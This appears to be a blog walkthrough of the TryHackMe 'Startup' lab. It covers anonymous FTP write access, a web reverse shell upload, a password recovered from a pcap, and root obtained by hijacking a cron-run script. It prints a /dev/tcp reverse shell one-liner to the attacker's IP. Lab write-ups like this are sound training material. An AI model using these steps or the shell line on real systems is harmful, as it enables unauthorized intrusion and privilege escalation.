# Startup

***
![](https://tryhackme-images.s3.amazonaws.com/room-icons/98d1e206f2d58494b67a1a52c0f8d244.png)

## Difficulty = Easy

***

Running our nmap scan we have 3 ports opened -:

```bash
# Nmap 7.94 scan initiated Fri Oct 20 01:25:57 2023 as: nmap -p80,21,22 -sCV -T4 -v --min-rate=1000 -oN nmap.txt 10.10.102.105
Nmap scan report for 10.10.102.105
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.75.133
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 20 01:26:17 2023 -- 1 IP address (1 host up) scanned in 19.40 seconds
```





Enumerating `FTP`, we have anonymous login enabled 🤟



![](https://i.imgur.com/vFnDBy0.png)




We can therefore use this command to download all files on the server


```bash
$ wget -m --no-passive ftp://anonymous:anonymous@10.10.102.105
```


Checking the files the only thing that gives us important information is `notice.txt`, which gives us a username called, **Maya**.


![](https://i.imgur.com/sci7wME.png)


Navigating to port `80/HTTP` we have a prompt telling us **"we'll be online shortly"**


![](https://i.imgur.com/5KvZHlz.png)

Viewing **Page-Source** nothing seems interesting here also

![](https://i.imgur.com/dShkQ7w.png)

Running dir/file bruteforce, we found a directory called `/files`

![](https://i.imgur.com/Wd4nkAB.png)


Navigating to `/files` we can see that all what we found in the **FTP** directory is still here


![](https://i.imgur.com/naVQJ99.png)


Well, we forgot to check if we can put files in the FTP directory


![](https://i.imgur.com/Shtfjiq.png)


Nice we can put files, but it is directory specific !, Meaning we can not put files on the base folder, but we can put files in an already created folder called `FTP`

![](https://i.pinimg.com/originals/39/73/c8/3973c89b972c2bf387065fc702643270.gif)


Now let upload our reverse shell and navigate to the website


![](https://i.imgur.com/ZdXTYXA.png)


Nice, our reverse shell have been uploaded


![](https://i.imgur.com/1csTG8g.png)


Now start up your listener and get your reverse shell back


![](https://i.imgur.com/onBG5Zo.png)

Navigating to the base folder `/` we have a `recipe.txt` file

![](https://i.imgur.com/2GJfC0W.png)

well we now know the **secret spicy soup recipe**, you can go ahead and answer the question

![](https://i.imgur.com/zEYnUBs.png)


We also have an **incidents** folder, that contains a `suspicious.pcapng` file

![](https://i.imgur.com/SRvdhCO.png)

Transfer the file to our target system and upload it to `wireshark`



![](https://i.imgur.com/Ecf2cFU.png)

On **wireshark** right-click on a packet and select **Follow >> Tcp Stream**


![](https://i.imgur.com/bZ0xPE3.png)


Keep Increasing the **stream** till we find important information (Just check stream 7 😂)


![](https://i.imgur.com/akNaViG.png)


We successfully have a password


![](https://i.imgur.com/oILcFdJ.png)

We can then login as user **lennie**


![](https://i.imgur.com/yYTJA5D.png)

Navigating to **lennie's** home directory we have a `script` folder

![](https://i.imgur.com/QWjrG3g.png)



The script folder has a `planner.sh` file

![](https://i.imgur.com/mE0AYYO.png)

Concatenating the `planner.sh` file, it also calls another file under `/etc` called `print.sh`

![](https://i.imgur.com/Wmf4tcd.png)

Looks like the `/etc/print.sh` file belongs to **lennie** and the `planner.sh` file belongs to user **root**, we can therefore upload our reverse shell here and get root

![](https://i.imgur.com/5bOSiiG.png)


By adding this payload to `/etc/print.sh` and then starting up our listener we can get our reverse shell


```bash
/bin/sh -i >& /dev/tcp/10.9.75.133/4444 0>&1
```


![](https://i.imgur.com/ynDr4fP.png)


Then start up your reverse shell using `netcat` and you should be root

![](https://i.imgur.com/OPuK6GJ.png)




> **_Note :_** Generally i ran `pspy32s` in other to know that the **planner.sh** script was running as a cronjob



Have fun 😁😎




<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>



